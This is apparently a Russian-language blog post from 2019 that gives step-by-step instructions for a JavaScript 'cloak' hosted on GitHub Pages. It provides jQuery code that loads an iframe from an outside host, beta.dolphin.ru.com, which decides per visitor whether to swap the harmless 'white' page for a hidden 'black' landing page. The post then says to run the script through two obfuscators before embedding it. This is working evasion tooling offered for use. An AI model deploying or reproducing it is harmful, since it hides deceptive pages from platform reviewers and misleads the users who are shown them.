<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width">
		

		<title>Настройка JS клоаки</title>

		
		<link rel="stylesheet" href="https://deniszhitnyakov.github.io/crocoblog/public/css/colors-gray.min.db04be02fe387d291ba1210d18f79b848f45c5b4b6422da04e2a97716683349f.css">

		
	</head>
	<body>
		<header id="header">
			<h1><a href="https://deniszhitnyakov.github.io/crocoblog/public/">Croco Blog</a></h1>
			<p></p>
		</header>

		<div id="page">
			<div id="sidebar">
				<nav>
	
		<ul class="nav">
			
				<li><a href="/crocoblog/public/"><span>Posts</span></a></li>
			
		</ul>
	
</nav>

			</div>

			<div id="content">
				
	<article class="post">
		<h1><a href="https://deniszhitnyakov.github.io/crocoblog/public/posts/github-klo/">Настройка JS клоаки</a> </h1>

		<div class="post-content">

<h2 id="вводные">Вводные</h2>

<p>В корне гитхаба должно быть 3 файла:</p>

<ul>
<li>файл <code>w.html</code> - это белая страница</li>
<li>файл <code>black.html</code> - это прокладка</li>
<li>файл <code>blog.html</code> - это копия белой страницы с клоакой, на которую будет идти трафик</li>
</ul>

<h2 id="установка-клоаки">Установка клоаки</h2>

<ol>
<li>Отредактировать код:
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">$</span>(<span style="color:#66d9ef">function</span> () {
    <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;body&#39;</span>).<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#39;&lt;iframe src=&#34;https://beta.dolphin.ru.com/magic/rukz.php?domain=ДОМЕН-GITHUB&amp;path=ИМЯ-РЕПОЗИТОРИЯ&#34;&gt;&lt;/iframe&gt;&#39;</span>);
    <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span> () {
        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;iframe&#39;</span>).<span style="color:#a6e22e">contents</span>().<span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#39;html&#39;</span>).<span style="color:#a6e22e">html</span>();
        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">frameLocation</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">frames</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span>;
        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">frameLocation</span>.<span style="color:#a6e22e">search</span>(<span style="color:#e6db74">&#39;black.html&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
            document.<span style="color:#a6e22e">open</span>();
            document.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">html</span>);
            document.<span style="color:#a6e22e">close</span>();
        }
        <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;iframe&#39;</span>).<span style="color:#a6e22e">remove</span>();
    }, <span style="color:#ae81ff">1500</span>);
});
</code></pre></div></li>
<li>Прогнать код через <a href="https://obfuscator.io/" target="_blank">обфускатор1</a></li>
<li>Проганать код через <a href="https://javascriptobfuscator.com/Javascript-Obfuscator.aspx" target="_blank">обфускатор2</a></li>
<li>Создать файл <code>js/1.js</code> и вставить результат работы обфускатора в него</li>
<li>Вставить на странице <code>white.html</code> перед закрывающим <code>&lt;/body&gt;</code> код:
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;js/1.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;</code></pre></div></li>
</ol>
</div>

		<p class="meta">Posted on <span class="postdate">25. October 2019</span></p>
	</article>

			</div>

			<footer id="footer">
				<p class="copyright">
					
						Powered by <a href="https://gohugo.io/">Hugo</a> and the
						<a href="https://github.com/bake/solar-theme-hugo">Solar</a>-theme.
					
				</p>
			</footer>
		</div>

		
	</body>
</html>
